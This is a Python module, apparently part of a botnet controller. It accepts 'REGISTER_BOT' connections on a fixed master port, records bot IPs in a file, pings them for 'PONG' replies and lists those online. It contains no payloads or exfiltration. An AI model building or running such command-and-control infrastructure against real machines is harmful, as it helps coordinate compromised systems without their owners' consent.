# bots.py: gestión de bots (registro, estado, historial)
import socket
import threading
import time
import os

BOT_FILE = 'bots.txt'
MASTER_COMMAND_PORT = 65432
PING_TIMEOUT = 3
PING_INTERVAL = 10

class BotManager:
    def __init__(self):
        self.bots = self.load_bots()
        self.bot_status = {}  # {"ip:port": "online"/"offline"}
        self.lock = threading.Lock()

    def load_bots(self):
        if not os.path.exists(BOT_FILE):
            return []
        with open(BOT_FILE, 'r') as f:
            return [tuple(line.strip().split(':')) for line in f if line.strip()]

    def save_bots(self):
        with open(BOT_FILE, 'w') as f:
            for ip, port in self.bots:
                f.write(f"{ip}:{port}\n")

    def register_bot(self, ip, port='65440'):
        with self.lock:
            if (ip, port) not in self.bots:
                self.bots.append((ip, port))
                self.save_bots()
            self.bot_status[f"{ip}:{port}"] = "online"

    def listen_for_bots(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', MASTER_COMMAND_PORT))
            s.listen()
            print(f"[+] Listening for bots on port {MASTER_COMMAND_PORT}")
            while True:
                try:
                    conn, addr = s.accept()
                    threading.Thread(target=self.handle_bot_connection, args=(conn, addr), daemon=True).start()
                except Exception as e:
                    print(f"[!] Error accepting bot connection: {e}")

    def handle_bot_connection(self, conn, addr):
        with conn:
            try:
                data = conn.recv(1024).decode().strip()
                if data == 'REGISTER_BOT':
                    self.register_bot(addr[0])
                    print(f"[+] Bot registered: {addr[0]}")
            except Exception as e:
                print(f"[!] Error handling bot connection: {e}")

    def update_status_loop(self):
        while True:
            self.update_bot_statuses()
            time.sleep(PING_INTERVAL)

    def update_bot_statuses(self):
        with self.lock:
            for ip, port in self.bots:
                key = f"{ip}:{port}"
                try:
                    with socket.create_connection((ip, int(port)), timeout=PING_TIMEOUT) as s:
                        s.sendall(b"PING")
                        response = s.recv(1024).decode().strip()
                        self.bot_status[key] = "online" if response == "PONG" else "offline"
                except:
                    self.bot_status[key] = "offline"

    def get_online_bots(self):
        with self.lock:
            return [(ip, port) for ip, port in self.bots if self.bot_status.get(f"{ip}:{port}") == "online"]

    def get_status(self):
        with self.lock:
            return self.bot_status.copy()
